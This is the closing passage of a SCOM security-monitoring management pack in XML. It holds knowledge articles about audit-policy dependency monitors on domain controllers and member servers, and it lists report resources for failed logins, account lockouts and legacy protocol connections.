              <maml:title>Configuration</maml:title>
              <maml:para>For this alert to work properly, GPO must be configured to properyly capture to process command line.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Causes</maml:title>
              <maml:para />
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Resolutions</maml:title>
              <maml:para />
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Additional Resources</maml:title>
              <maml:para>See this article for details.  https://nathangau.wordpress.com/2019/03/15/security-monitoring-using-scom-to-detect-remote-wmi-attempts/</maml:para>
            </maml:section>
          </MamlContent>
        </KnowledgeArticle>
        <KnowledgeArticle ElementID="Security.Monitoring.AccountLogonForDC" Visible="true">
          <MamlContent>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Summary</maml:title>
              <maml:para>This Dependency monitor tracks "Logon" audit setting on DCs.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Configuration</maml:title>
              <maml:para>There are no overrides for this rule.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Causes</maml:title>
              <maml:para>There are minimum logging requirements for Domain Controllers and for Member Servers in order for this Management Pack to function correctly.  </maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Resolutions</maml:title>
              <maml:para>Review the articles in the "Additional Information" section and configure auditing to comply with requirements.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Additional Information</maml:title>
              <maml:para>Blog Article (Nathan Gau). https://nathangau.wordpress.com/tag/auditpol/</maml:para>
              <maml:para>Official Documentation (Microsoft). https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations</maml:para>
            </maml:section>
          </MamlContent>
        </KnowledgeArticle>
        <KnowledgeArticle ElementID="Security.Monitoring.AccountLogonForMS" Visible="true">
          <MamlContent>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Summary</maml:title>
              <maml:para>This Dependency monitor tracks "Logon" audit setting on Member Servers (MSs).</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Configuration</maml:title>
              <maml:para>There are no overrides for this rule.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Causes</maml:title>
              <maml:para>There are minimum logging requirements for Domain Controllers and for Member Servers in order for this Management Pack to function correctly.  </maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Resolutions</maml:title>
              <maml:para>Review the articles in the "Additional Information" section and configure auditing to comply with requirements.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Additional Information</maml:title>
              <maml:para>Blog Article (Nathan Gau). https://nathangau.wordpress.com/tag/auditpol/</maml:para>
              <maml:para>Official Documentation (Microsoft). https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations</maml:para>
            </maml:section>
          </MamlContent>
        </KnowledgeArticle>
        <KnowledgeArticle ElementID="Security.Monitoring.IncludeCommandLineProcessCreationonMS" Visible="true">
          <MamlContent>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Summary</maml:title>
              <maml:para>This Dependency monitor tracks "Process Creation" audit setting on Member Servers (MSs).</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Configuration</maml:title>
              <maml:para>There are no overrides for this rule.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Causes</maml:title>
              <maml:para>There are minimum logging requirements for Domain Controllers and for Member Servers in order for this Management Pack to function correctly.  </maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Resolutions</maml:title>
              <maml:para>Review the articles in the "Additional Information" section and configure auditing to comply with requirements.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Additional Information</maml:title>
              <maml:para>Blog Article (Nathan Gau). https://nathangau.wordpress.com/tag/auditpol/</maml:para>
              <maml:para>Official Documentation (Microsoft). https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations</maml:para>
            </maml:section>
          </MamlContent>
        </KnowledgeArticle>
        <KnowledgeArticle ElementID="Security.Monitoring.IncludeCommandLineProcessCreationonDCs" Visible="true">
          <MamlContent>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Summary</maml:title>
              <maml:para>This Dependency monitor tracks "Process Creation" audit setting on DCs.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Configuration</maml:title>
              <maml:para>There are no overrides for this rule.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Causes</maml:title>
              <maml:para>There are minimum logging requirements for Domain Controllers and for Member Servers in order for this Management Pack to function correctly.  </maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Resolutions</maml:title>
              <maml:para>Review the articles in the "Additional Information" section and configure auditing to comply with requirements.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Additional Information</maml:title>
              <maml:para>Blog Article (Nathan Gau). https://nathangau.wordpress.com/tag/auditpol/</maml:para>
              <maml:para>Official Documentation (Microsoft). https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations</maml:para>
            </maml:section>
          </MamlContent>
        </KnowledgeArticle>
        <KnowledgeArticle ElementID="Security.Monitoring.AuditAccountLogonDC" Visible="true">
          <MamlContent>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Summary</maml:title>
              <maml:para>This Dependency monitor tracks "Logon" audit setting on DCs.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Configuration</maml:title>
              <maml:para>There are no overrides for this rule.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Causes</maml:title>
              <maml:para>There are minimum logging requirements for Domain Controllers and for Member Servers in order for this Management Pack to function correctly.  </maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Resolutions</maml:title>
              <maml:para>Review the articles in the "Additional Information" section and configure auditing to comply with requirements.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Additional Information</maml:title>
              <maml:para>Blog Article (Nathan Gau). https://nathangau.wordpress.com/tag/auditpol/</maml:para>
              <maml:para>Official Documentation (Microsoft). https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations</maml:para>
            </maml:section>
          </MamlContent>
        </KnowledgeArticle>
      </KnowledgeArticles>
    </LanguagePack>
  </LanguagePacks>
  <Resources>
    <ReportResource ID="FailedLoginDetails.ID" Accessibility="Internal" FileName="Failed Login Details_v1.rdl" HasNullStream="false" MIMEType="application/octet-stream" />
    <ReportResource ID="AccountLockout.ID" Accessibility="Internal" FileName="Account Lockout Report V3.rdl" HasNullStream="false" MIMEType="application/octet-stream" />
    <ReportResource ID="FailedLoginSummary.ID" Accessibility="Internal" FileName="Failed Login Summary_v1.rdl" HasNullStream="false" MIMEType="application/octet-stream" />
    <ReportResource ID="FailedLoginSummary24.ID" Accessibility="Internal" FileName="Failed Login Summary (24 hours)_v1.rdl" HasNullStream="false" MIMEType="application/octet-stream" />
    <ReportResource ID="AlertSummary.ID" Accessibility="Internal" FileName="Alert Summary_v1.rdl" HasNullStream="false" MIMEType="application/octet-stream" />
    <ReportResource ID="EventCollectionSummary.ID" Accessibility="Internal" FileName="Event Collection Report_v1.rdl" HasNullStream="false" MIMEType="application/octet-stream" />
    <ReportResource ID="BatchLogonReport.ID" Accessibility="Internal" FileName="Batch Logon Report_v1.2.rdl" HasNullStream="false" MIMEType="application/octet-stream" />
    <ReportResource ID="SMBv1ConnectionReport.ID" Accessibility="Internal" FileName="SMBv1 Connections Report_v1.rdl" HasNullStream="false" MIMEType="application/octet-stream" />
    <ReportResource ID="LanManConnectionReport.ID" Accessibility="Internal" FileName="LanMan.rdl" HasNullStream="false" MIMEType="application/octet-stream" />
    <ReportResource ID="NTLMv1ConnectionReport.ID" Accessibility="Internal" FileName="NTLMV1.rdl" HasNullStream="false" MIMEType="application/octet-stream" />
    <ReportResource ID="WDigestConnectionReport.ID" Accessibility="Internal" FileName="Wdigest.rdl" HasNullStream="false" MIMEType="application/octet-stream" />
    <ReportResource ID="LegacyTLSConnectionReport.ID" Accessibility="Internal" FileName="LegacyTLS.rdl" HasNullStream="false" MIMEType="application/octet-stream" />
  </Resources>
</ManagementPack>
